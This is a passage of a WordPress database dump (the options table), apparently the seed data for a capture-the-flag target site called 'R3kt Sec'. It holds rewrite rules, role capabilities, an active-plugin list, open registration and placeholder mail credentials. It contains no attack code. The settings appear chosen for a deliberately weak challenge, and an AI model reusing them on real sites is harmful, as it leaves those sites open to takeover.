  `option_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `option_value` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `autoload` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'yes'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_options`
--

INSERT INTO `wp_options` (`option_id`, `option_name`, `option_value`, `autoload`) VALUES
(1, 'siteurl', 'http://exp-2-2', 'yes'),
(2, 'home', 'http://exp-2-2', 'yes'),
(3, 'blogname', 'R3kt Sec', 'yes'),
(4, 'blogdescription', 'Zero Days 4 Days', 'yes'),
(5, 'users_can_register', '1', 'yes'),
(6, 'admin_email', 'notreal@notreal.wac.tf', 'yes'),
(7, 'start_of_week', '1', 'yes'),
(8, 'use_balanceTags', '0', 'yes'),
(9, 'use_smilies', '1', 'yes'),
(10, 'require_name_email', '1', 'yes'),
(11, 'comments_notify', '1', 'yes'),
(12, 'posts_per_rss', '10', 'yes'),
(13, 'rss_use_excerpt', '0', 'yes'),
(14, 'mailserver_url', 'mail.example.com', 'yes'),
(15, 'mailserver_login', 'login@example.com', 'yes'),
(16, 'mailserver_pass', 'password', 'yes'),
(17, 'mailserver_port', '110', 'yes'),
(18, 'default_category', '1', 'yes'),
(19, 'default_comment_status', 'open', 'yes'),
(20, 'default_ping_status', 'open', 'yes'),
(21, 'default_pingback_flag', '0', 'yes'),
(22, 'posts_per_page', '10', 'yes'),
(23, 'date_format', 'F j, Y', 'yes'),
(24, 'time_format', 'g:i a', 'yes'),
(25, 'links_updated_date_format', 'F j, Y g:i a', 'yes'),
(26, 'comment_moderation', '0', 'yes'),
(27, 'moderation_notify', '1', 'yes'),
(28, 'permalink_structure', '/%year%/%monthnum%/%day%/%postname%/', 'yes'),
(29, 'rewrite_rules', 'a:109:{s:42:\"(.*/)?events/(\\d{4})-(\\d{2})-(\\d{2})/c(.*)\";s:95:\"index.php?page_id=60&calendar_day=$matches[2]-$matches[3]-$matches[4]&eme_event_cat=$matches[5]\";s:39:\"(.*/)?events/(\\d{4})-(\\d{2})-(\\d{2})/?$\";s:69:\"index.php?page_id=60&calendar_day=$matches[2]-$matches[3]-$matches[4]\";s:42:\"(.*/)?events/(\\d{4})-(\\d{2})-(\\d{2})/(.+)$\";s:81:\"index.php?page_id=60&calendar_day=$matches[2]-$matches[3]-$matches[4]&$matches[5]\";s:21:\"(.*/)?events/(\\d+)/.*\";s:41:\"index.php?page_id=60&event_id=$matches[2]\";s:19:\"(.*/)?events/p/(.*)\";s:46:\"index.php?page_id=60&eme_pmt_rndid=$matches[2]\";s:25:\"(.*/)?events/confirm/(.*)\";s:46:\"index.php?page_id=60&eme_pmt_rndid=$matches[2]\";s:22:\"(.*/)?events/town/(.*)\";s:41:\"index.php?page_id=60&eme_city=$matches[2]\";s:22:\"(.*/)?events/city/(.*)\";s:41:\"index.php?page_id=60&eme_city=$matches[2]\";s:25:\"(.*/)?events/country/(.*)\";s:44:\"index.php?page_id=60&eme_country=$matches[2]\";s:21:\"(.*/)?events/cat/(.*)\";s:46:\"index.php?page_id=60&eme_event_cat=$matches[2]\";s:17:\"(.*/)?events/(.*)\";s:41:\"index.php?page_id=60&event_id=$matches[2]\";s:24:\"(.*/)?locations/(\\d+)/.*\";s:44:\"index.php?page_id=60&location_id=$matches[2]\";s:20:\"(.*/)?locations/(.*)\";s:44:\"index.php?page_id=60&location_id=$matches[2]\";s:11:\"^wp-json/?$\";s:22:\"index.php?rest_route=/\";s:14:\"^wp-json/(.*)?\";s:33:\"index.php?rest_route=/$matches[1]\";s:21:\"^index.php/wp-json/?$\";s:22:\"index.php?rest_route=/\";s:24:\"^index.php/wp-json/(.*)?\";s:33:\"index.php?rest_route=/$matches[1]\";s:17:\"^wp-sitemap\\.xml$\";s:23:\"index.php?sitemap=index\";s:17:\"^wp-sitemap\\.xsl$\";s:36:\"index.php?sitemap-stylesheet=sitemap\";s:23:\"^wp-sitemap-index\\.xsl$\";s:34:\"index.php?sitemap-stylesheet=index\";s:48:\"^wp-sitemap-([a-z]+?)-([a-z\\d_-]+?)-(\\d+?)\\.xml$\";s:75:\"index.php?sitemap=$matches[1]&sitemap-subtype=$matches[2]&paged=$matches[3]\";s:34:\"^wp-sitemap-([a-z]+?)-(\\d+?)\\.xml$\";s:47:\"index.php?sitemap=$matches[1]&paged=$matches[2]\";s:57:\"category/(.+?)/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:52:\"index.php?category_name=$matches[1]&feed=$matches[2]\";s:52:\"category/(.+?)/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:52:\"index.php?category_name=$matches[1]&feed=$matches[2]\";s:23:\"category/(.+?)/embed/?$\";s:46:\"index.php?category_name=$matches[1]&embed=true\";s:35:\"category/(.+?)/page/?([0-9]{1,})/?$\";s:53:\"index.php?category_name=$matches[1]&paged=$matches[2]\";s:17:\"category/(.+?)/?$\";s:35:\"index.php?category_name=$matches[1]\";s:54:\"tag/([^/]+)/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:42:\"index.php?tag=$matches[1]&feed=$matches[2]\";s:49:\"tag/([^/]+)/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:42:\"index.php?tag=$matches[1]&feed=$matches[2]\";s:20:\"tag/([^/]+)/embed/?$\";s:36:\"index.php?tag=$matches[1]&embed=true\";s:32:\"tag/([^/]+)/page/?([0-9]{1,})/?$\";s:43:\"index.php?tag=$matches[1]&paged=$matches[2]\";s:14:\"tag/([^/]+)/?$\";s:25:\"index.php?tag=$matches[1]\";s:55:\"type/([^/]+)/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:50:\"index.php?post_format=$matches[1]&feed=$matches[2]\";s:50:\"type/([^/]+)/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:50:\"index.php?post_format=$matches[1]&feed=$matches[2]\";s:21:\"type/([^/]+)/embed/?$\";s:44:\"index.php?post_format=$matches[1]&embed=true\";s:33:\"type/([^/]+)/page/?([0-9]{1,})/?$\";s:51:\"index.php?post_format=$matches[1]&paged=$matches[2]\";s:15:\"type/([^/]+)/?$\";s:33:\"index.php?post_format=$matches[1]\";s:12:\"robots\\.txt$\";s:18:\"index.php?robots=1\";s:13:\"favicon\\.ico$\";s:19:\"index.php?favicon=1\";s:48:\".*wp-(atom|rdf|rss|rss2|feed|commentsrss2)\\.php$\";s:18:\"index.php?feed=old\";s:20:\".*wp-app\\.php(/.*)?$\";s:19:\"index.php?error=403\";s:18:\".*wp-register.php$\";s:23:\"index.php?register=true\";s:42:\"feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:27:\"index.php?&feed=$matches[1]\";s:37:\"(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:27:\"index.php?&feed=$matches[1]\";s:8:\"embed/?$\";s:21:\"index.php?&embed=true\";s:20:\"page/?([0-9]{1,})/?$\";s:28:\"index.php?&paged=$matches[1]\";s:51:\"comments/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:42:\"index.php?&feed=$matches[1]&withcomments=1\";s:46:\"comments/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:42:\"index.php?&feed=$matches[1]&withcomments=1\";s:17:\"comments/embed/?$\";s:21:\"index.php?&embed=true\";s:54:\"search/(.+)/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:40:\"index.php?s=$matches[1]&feed=$matches[2]\";s:49:\"search/(.+)/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:40:\"index.php?s=$matches[1]&feed=$matches[2]\";s:20:\"search/(.+)/embed/?$\";s:34:\"index.php?s=$matches[1]&embed=true\";s:32:\"search/(.+)/page/?([0-9]{1,})/?$\";s:41:\"index.php?s=$matches[1]&paged=$matches[2]\";s:14:\"search/(.+)/?$\";s:23:\"index.php?s=$matches[1]\";s:57:\"author/([^/]+)/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:50:\"index.php?author_name=$matches[1]&feed=$matches[2]\";s:52:\"author/([^/]+)/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:50:\"index.php?author_name=$matches[1]&feed=$matches[2]\";s:23:\"author/([^/]+)/embed/?$\";s:44:\"index.php?author_name=$matches[1]&embed=true\";s:35:\"author/([^/]+)/page/?([0-9]{1,})/?$\";s:51:\"index.php?author_name=$matches[1]&paged=$matches[2]\";s:17:\"author/([^/]+)/?$\";s:33:\"index.php?author_name=$matches[1]\";s:79:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:80:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&feed=$matches[4]\";s:74:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:80:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&feed=$matches[4]\";s:45:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/embed/?$\";s:74:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&embed=true\";s:57:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/page/?([0-9]{1,})/?$\";s:81:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&paged=$matches[4]\";s:39:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/?$\";s:63:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]\";s:66:\"([0-9]{4})/([0-9]{1,2})/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:64:\"index.php?year=$matches[1]&monthnum=$matches[2]&feed=$matches[3]\";s:61:\"([0-9]{4})/([0-9]{1,2})/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:64:\"index.php?year=$matches[1]&monthnum=$matches[2]&feed=$matches[3]\";s:32:\"([0-9]{4})/([0-9]{1,2})/embed/?$\";s:58:\"index.php?year=$matches[1]&monthnum=$matches[2]&embed=true\";s:44:\"([0-9]{4})/([0-9]{1,2})/page/?([0-9]{1,})/?$\";s:65:\"index.php?year=$matches[1]&monthnum=$matches[2]&paged=$matches[3]\";s:26:\"([0-9]{4})/([0-9]{1,2})/?$\";s:47:\"index.php?year=$matches[1]&monthnum=$matches[2]\";s:53:\"([0-9]{4})/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:43:\"index.php?year=$matches[1]&feed=$matches[2]\";s:48:\"([0-9]{4})/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:43:\"index.php?year=$matches[1]&feed=$matches[2]\";s:19:\"([0-9]{4})/embed/?$\";s:37:\"index.php?year=$matches[1]&embed=true\";s:31:\"([0-9]{4})/page/?([0-9]{1,})/?$\";s:44:\"index.php?year=$matches[1]&paged=$matches[2]\";s:13:\"([0-9]{4})/?$\";s:26:\"index.php?year=$matches[1]\";s:58:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:68:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:98:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:93:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:83:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:64:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:53:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/embed/?$\";s:91:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&embed=true\";s:57:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/trackback/?$\";s:85:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&tb=1\";s:87:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:97:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&feed=$matches[5]\";s:82:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:97:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&feed=$matches[5]\";s:65:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/page/?([0-9]{1,})/?$\";s:98:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&paged=$matches[5]\";s:72:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)/comment-page-([0-9]{1,})/?$\";s:98:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&cpage=$matches[5]\";s:61:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/([^/]+)(?:/([0-9]+))?/?$\";s:97:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&name=$matches[4]&page=$matches[5]\";s:47:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:57:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:87:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:82:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:72:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:53:\"[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}/[^/]+/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:64:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/comment-page-([0-9]{1,})/?$\";s:81:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&cpage=$matches[4]\";s:51:\"([0-9]{4})/([0-9]{1,2})/comment-page-([0-9]{1,})/?$\";s:65:\"index.php?year=$matches[1]&monthnum=$matches[2]&cpage=$matches[3]\";s:38:\"([0-9]{4})/comment-page-([0-9]{1,})/?$\";s:44:\"index.php?year=$matches[1]&cpage=$matches[2]\";s:27:\".?.+?/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:37:\".?.+?/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:67:\".?.+?/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:62:\".?.+?/attachment/([^/]+)/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\".?.+?/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:33:\".?.+?/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:16:\"(.?.+?)/embed/?$\";s:41:\"index.php?pagename=$matches[1]&embed=true\";s:20:\"(.?.+?)/trackback/?$\";s:35:\"index.php?pagename=$matches[1]&tb=1\";s:50:\"(.?.+?)/feed/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:47:\"index.php?pagename=$matches[1]&feed=$matches[2]\";s:45:\"(.?.+?)/(feed|rdf|rss|rss2|atom|gwolle_gb)/?$\";s:47:\"index.php?pagename=$matches[1]&feed=$matches[2]\";s:28:\"(.?.+?)/page/?([0-9]{1,})/?$\";s:48:\"index.php?pagename=$matches[1]&paged=$matches[2]\";s:35:\"(.?.+?)/comment-page-([0-9]{1,})/?$\";s:48:\"index.php?pagename=$matches[1]&cpage=$matches[2]\";s:24:\"(.?.+?)(?:/([0-9]+))?/?$\";s:47:\"index.php?pagename=$matches[1]&page=$matches[2]\";}', 'yes'),
(30, 'hack_file', '0', 'yes'),
(31, 'blog_charset', 'UTF-8', 'yes'),
(32, 'moderation_keys', '', 'no'),
(33, 'active_plugins', 'a:3:{i:0;s:35:\"events-made-easy/events-manager.php\";i:1;s:23:\"gwolle-gb/gwolle-gb.php\";i:2;s:51:\"wp-limit-login-attempts/wp-limit-login-attempts.php\";}', 'yes'),
(34, 'category_base', '', 'yes'),
(35, 'ping_sites', 'http://rpc.pingomatic.com/', 'yes'),
(36, 'comment_max_links', '2', 'yes'),
(37, 'gmt_offset', '0', 'yes'),
(38, 'default_email_category', '1', 'yes'),
(39, 'recently_edited', 'a:3:{i:0;s:57:\"/var/www/html/wp-content/themes/twentytwentytwo/style.css\";i:1;s:52:\"/var/www/html/wp-content/plugins/akismet/akismet.php\";i:2;s:0:\"\";}', 'no'),
(40, 'template', 'exs', 'yes'),
(41, 'stylesheet', 'exs-dark', 'yes'),
(42, 'comment_registration', '0', 'yes'),
(43, 'html_type', 'text/html', 'yes'),
(44, 'use_trackback', '0', 'yes'),
(45, 'default_role', 'subscriber', 'yes'),
(46, 'db_version', '53496', 'yes'),
(47, 'uploads_use_yearmonth_folders', '1', 'yes'),
(48, 'upload_path', '', 'yes'),
(49, 'blog_public', '0', 'yes'),
(50, 'default_link_category', '2', 'yes'),
(51, 'show_on_front', 'posts', 'yes'),
(52, 'tag_base', '', 'yes'),
(53, 'show_avatars', '1', 'yes'),
(54, 'avatar_rating', 'G', 'yes'),
(55, 'upload_url_path', '', 'yes'),
(56, 'thumbnail_size_w', '150', 'yes'),
(57, 'thumbnail_size_h', '150', 'yes'),
(58, 'thumbnail_crop', '1', 'yes'),
(59, 'medium_size_w', '300', 'yes'),
(60, 'medium_size_h', '300', 'yes'),
(61, 'avatar_default', 'mystery', 'yes'),
(62, 'large_size_w', '1024', 'yes'),
(63, 'large_size_h', '1024', 'yes'),
(64, 'image_default_link_type', 'none', 'yes'),
(65, 'image_default_size', '', 'yes'),
(66, 'image_default_align', '', 'yes'),
(67, 'close_comments_for_old_posts', '0', 'yes'),
(68, 'close_comments_days_old', '14', 'yes'),
(69, 'thread_comments', '1', 'yes'),
(70, 'thread_comments_depth', '5', 'yes'),
(71, 'page_comments', '0', 'yes'),
(72, 'comments_per_page', '50', 'yes'),
(73, 'default_comments_page', 'newest', 'yes'),
(74, 'comment_order', 'asc', 'yes'),
(75, 'sticky_posts', 'a:0:{}', 'yes'),
(76, 'widget_categories', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(77, 'widget_text', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(78, 'widget_rss', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(79, 'uninstall_plugins', 'a:1:{s:24:\"wordpress-seo/wp-seo.php\";s:14:\"__return_false\";}', 'no'),
(80, 'timezone_string', '', 'yes'),
(81, 'page_for_posts', '0', 'yes'),
(82, 'page_on_front', '0', 'yes'),
(83, 'default_post_format', '0', 'yes'),
(84, 'link_manager_enabled', '0', 'yes'),
(85, 'finished_splitting_shared_terms', '1', 'yes'),
(86, 'site_icon', '0', 'yes'),
(87, 'medium_large_size_w', '768', 'yes'),
(88, 'medium_large_size_h', '0', 'yes'),
(89, 'wp_page_for_privacy_policy', '3', 'yes'),
(90, 'show_comments_cookies_opt_in', '1', 'yes'),
(91, 'admin_email_lifespan', '1682062179', 'yes'),
(92, 'disallowed_keys', '', 'no'),
(93, 'comment_previously_approved', '1', 'yes'),
(94, 'auto_plugin_theme_update_emails', 'a:0:{}', 'no'),
(95, 'auto_update_core_dev', 'enabled', 'yes'),
(96, 'auto_update_core_minor', 'enabled', 'yes'),
(97, 'auto_update_core_major', 'enabled', 'yes'),
(98, 'wp_force_deactivated_plugins', 'a:0:{}', 'yes'),
(99, 'initial_db_version', '53496', 'yes'),
(100, 'wp_user_roles', 'a:7:{s:13:\"administrator\";a:2:{s:4:\"name\";s:13:\"Administrator\";s:12:\"capabilities\";a:64:{s:13:\"switch_themes\";b:1;s:11:\"edit_themes\";b:1;s:16:\"activate_plugins\";b:1;s:12:\"edit_plugins\";b:1;s:10:\"edit_users\";b:1;s:10:\"edit_files\";b:1;s:14:\"manage_options\";b:1;s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:6:\"import\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:8:\"level_10\";b:1;s:7:\"level_9\";b:1;s:7:\"level_8\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:12:\"delete_users\";b:1;s:12:\"create_users\";b:1;s:17:\"unfiltered_upload\";b:1;s:14:\"edit_dashboard\";b:1;s:14:\"update_plugins\";b:1;s:14:\"delete_plugins\";b:1;s:15:\"install_plugins\";b:1;s:13:\"update_themes\";b:1;s:14:\"install_themes\";b:1;s:11:\"update_core\";b:1;s:10:\"list_users\";b:1;s:12:\"remove_users\";b:1;s:13:\"promote_users\";b:1;s:18:\"edit_theme_options\";b:1;s:13:\"delete_themes\";b:1;s:6:\"export\";b:1;s:20:\"wpseo_manage_options\";b:1;s:15:\"manage_security\";b:1;s:10:\"copy_posts\";b:1;}}s:6:\"editor\";a:2:{s:4:\"name\";s:6:\"Editor\";s:12:\"capabilities\";a:37:{s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:15:\"wpseo_bulk_edit\";b:1;s:28:\"wpseo_edit_advanced_metadata\";b:1;s:10:\"copy_posts\";b:1;}}s:6:\"author\";a:2:{s:4:\"name\";s:6:\"Author\";s:12:\"capabilities\";a:10:{s:12:\"upload_files\";b:1;s:10:\"edit_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:4:\"read\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:12:\"delete_posts\";b:1;s:22:\"delete_published_posts\";b:1;}}s:11:\"contributor\";a:2:{s:4:\"name\";s:11:\"Contributor\";s:12:\"capabilities\";a:5:{s:10:\"edit_posts\";b:1;s:4:\"read\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:12:\"delete_posts\";b:1;}}s:10:\"subscriber\";a:2:{s:4:\"name\";s:10:\"Subscriber\";s:12:\"capabilities\";a:2:{s:4:\"read\";b:1;s:7:\"level_0\";b:1;}}s:13:\"wpseo_manager\";a:2:{s:4:\"name\";s:11:\"SEO Manager\";s:12:\"capabilities\";a:39:{s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:15:\"wpseo_bulk_edit\";b:1;s:28:\"wpseo_edit_advanced_metadata\";b:1;s:20:\"wpseo_manage_options\";b:1;s:23:\"view_site_health_checks\";b:1;s:10:\"copy_posts\";b:1;}}s:12:\"wpseo_editor\";a:2:{s:4:\"name\";s:10:\"SEO Editor\";s:12:\"capabilities\";a:37:{s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:15:\"wpseo_bulk_edit\";b:1;s:28:\"wpseo_edit_advanced_metadata\";b:1;s:10:\"copy_posts\";b:1;}}}', 'yes'),
(101, 'fresh_site', '0', 'yes'),
(102, 'user_count', '3', 'no'),
(103, 'widget_block', 'a:6:{i:2;a:1:{s:7:\"content\";s:19:\"<!-- wp:search /-->\";}i:3;a:1:{s:7:\"content\";s:154:\"<!-- wp:group --><div class=\"wp-block-group\"><!-- wp:heading --><h2>Recent Posts</h2><!-- /wp:heading --><!-- wp:latest-posts /--></div><!-- /wp:group -->\";}i:4;a:1:{s:7:\"content\";s:227:\"<!-- wp:group --><div class=\"wp-block-group\"><!-- wp:heading --><h2>Recent Comments</h2><!-- /wp:heading --><!-- wp:latest-comments {\"displayAvatar\":false,\"displayDate\":false,\"displayExcerpt\":false} /--></div><!-- /wp:group -->\";}i:5;a:1:{s:7:\"content\";s:146:\"<!-- wp:group --><div class=\"wp-block-group\"><!-- wp:heading --><h2>Archives</h2><!-- /wp:heading --><!-- wp:archives /--></div><!-- /wp:group -->\";}i:6;a:1:{s:7:\"content\";s:150:\"<!-- wp:group --><div class=\"wp-block-group\"><!-- wp:heading 